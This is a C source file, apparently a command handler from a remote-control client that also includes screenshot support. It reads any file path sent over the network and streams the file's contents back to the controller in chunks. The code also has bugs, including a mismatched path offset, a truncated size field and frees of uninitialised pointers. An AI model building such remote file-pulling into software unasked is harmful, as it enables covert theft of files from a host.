#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "screenshot.h"

#define COMMAND_GET_FILE_END 0x2
#define COMMAND_GET_FILE_DATA 0x5

int command_Get_File(uint8* msg)
{
	if(!strlen((char*)msg + 1))
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	FILE *f = fopen((char*)msg , "rb");

	if(!f)
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	fseek(f, 0, SEEK_END);
	uint64 size = ftell(f);
	fseek(f, 0, SEEK_SET);

	uint8* fileData = malloc(size + sizeof(uint8));
	memset(fileData, 0, size + sizeof(uint8));

	if(!fread(fileData, 1, size, f))
	{
		free(fileData);
		fclose(f);

		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	fclose(f);

	uint8 s_size[5];
	s_size[0] = (size) & 0xFF;
	s_size[1] = (size >> 8) & 0xFF;
	s_size[2] = (size >> 16) & 0xFF;
	s_size[3] = (size >> 24) & 0xFF;
	s_size[4] = 0;

	if(net_SendCmd(s_size, 5, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
	{
		free(fileData);
		
		return NET_LOST_CONNECTION;
	}

	uint8* rmsg;

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		free(rmsg);
		free(fileData);

		return NET_LOST_CONNECTION;
	}

	if(rmsg[0] != COMMANDS_APPROVE)
	{
		free(rmsg);
		free(fileData);

		return NET_LOST_CONNECTION;
	}

	free(rmsg);

	uint32 i;
	uint32 bufferIndex = 0;
	uint8 buffer[NET_BUFFSIE_MAX_CONTENT];
	memset(buffer, 0, NET_BUFFSIE_MAX_CONTENT);

	for(i = 0; i != size; i++)
	{
		if(bufferIndex >= NET_BUFFSIE_MAX_CONTENT)
		{
			if(net_SendCmd(buffer, NET_BUFFSIE_MAX_CONTENT, COMMAND_GET_FILE_DATA) == NET_LOST_CONNECTION)
			{
				free(fileData);

				return NET_LOST_CONNECTION;
			}

			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				free(fileData);
				free(rmsg);

				return NET_LOST_CONNECTION;
			}

			free(rmsg);
			memset(buffer, 0, NET_BUFFSIE_MAX_CONTENT);
			bufferIndex = 0;
		}

		buffer[bufferIndex++] = fileData[i];
	}

	free(fileData);

	if(bufferIndex != 0 && bufferIndex <= NET_BUFFSIE_MAX_CONTENT)
	{
		if(net_SendCmd(buffer, bufferIndex, COMMAND_GET_FILE_DATA) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			free(rmsg);

			return NET_LOST_CONNECTION;
		}

		free(rmsg);
		memset(buffer, 0, NET_BUFFSIE_MAX_CONTENT);
		bufferIndex = 0;
	}

	if(net_SendCmd((uint8*)" ", 1, COMMAND_GET_FILE_END) == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;
	}

	return COMMANDS_SUCC;
}